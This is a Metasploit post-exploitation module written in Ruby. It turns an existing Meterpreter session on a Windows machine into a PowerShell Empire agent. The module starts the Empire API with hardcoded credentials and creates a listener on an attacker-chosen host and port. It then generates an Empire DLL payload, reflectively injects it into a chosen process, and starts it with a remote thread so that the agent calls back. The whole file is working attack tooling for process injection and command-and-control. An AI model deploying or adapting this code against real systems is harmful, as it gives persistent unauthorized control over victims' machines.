##
# This module requires Metaspoit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'
require 'msf/core/empire_lib'
require 'msf/base/sessions/empire'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info,
                      "Name"                => "Upgrading to Empire from Meterpreter Post Module",
                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled in your machine.",
                      "LICENSE"             => MSF_LICENSE,
                      "Platform"            => ["windows"],
                      "SessionTypes"        => ["meterpreter"],
                      "Author"              => ["author"]
                     ))
    register_options(
      [
        OptAddress.new('LHOST',
                       [false, 'Host to start the listener on']),
        OptPort.new('LPORT',
                    [false, 'Port for payload to connect to, make sure port is not already in use']),
        OptString.new('PathToEmpire',
                      [true, 'The Complete Path to Empire-Web API']),
        OptInt.new('PID',
                   [true,'Process Identifier to inject the Empire payload into'])
      ])
  end
  def run
    #recurrsive method to generate an open port number
    def gen_port()
      port_number = rand(2000..62000)
      command = "netstat -nlt | grep #{port_number}"
      value = system(command)
      if value
        gen_port()
      else
        return port_number
      end
    end
    #Trying to get localhost from the framwork
    if datastore['LHOST']
      @host = datastore['LHOST']
    elsif framework.datastore['LHOST']
      @host = framework.datastore['LHOST']
    else
      @host = session.tunnel_local.split(':')[0]
      if @host == 'Local Pipe'
        print_error('LHOST is "Local Pipe", please manualy set the correct IP')
        return
      end
    end
    #trying to allot open port
    if datastore['LPORT']
      @port = datastore['LPORT']
    elsif
      @port = gen_port().to_s
    end
    #Storing user inputs
    @path = datastore['PathToEmpire'].to_s.chomp
    @pid = datastore['PID'].to_i
    @listener_name = 'Listener_Emp'

    #Changing the working directory to the provided path
    Dir.chdir(@path)

    #method to initiate the web-API
    def initiate_API
      print_status("Initiating the Empire Web-API instance. Might take few moments")
      command = "netstat -nlt | grep 1337"
      value = system(command)
      raise "Port 1337 already in use." if value
      command = "./empire --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
      value = system(command)
    end

    #main function
    def main
      #Setting up Empire
      sleep(10)

      #Creating Empire Instance
      print_status("Creating Empire Instance")
      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
      #Checking listener status
      response = client_emp.is_listener_active(@listener_name)
      if response == false
        print_status(client_emp.create_listener(@listener_name, @port, @host))
      else
        print_status(response)
      end

      #Defining the payload path
      payload_path = '/tmp/launcher-emp.dll'

      #Creating Empire DLL
      print_status(client_emp.generate_dll(@listener_name,payload_path,'x64',@path))

      #Injecting the created DLL payload reflectively in provided process
      host_process = client.sys.process.open(@pid, PROCESS_ALL_ACCESS)
      print_status("Injecting #{payload_path} into #{@pid}")
      dll_mem, offset = inject_dll_into_process(host_process, payload_path)
      print_status("DLL Injected. Executing Reflective loader")
      host_process.thread.create(dll_mem + offset, 0)
      print_status("DLL injected and invoked")
      print_status("Waiting for incoming agents")

      #Fetching the agent at an interval of 10 seconds.
      sleep(7)
      agents = client_emp.get_agents
      agents.each do |listener, session_id|
        if listener == @listener_name
          @agent_name = session_id.to_s
          print_status("Agent Connected : #{session_id} to listener : #{@listener_name}")
        end
      end

      #Register a Windows Session
      empire_session = Msf::Sessions::EmpireShellWindows.new(client_emp, @agent_name)
      framework.sessions.register(empire_session)
      print_status("Empire Session created")

    end

    #Commencing threads
    thread_api = Thread.new{
      initiate_API()
    }
    thread_main = Thread.new{
      main()
    }

    #Joining the main thread
    thread_main.join

  end
end


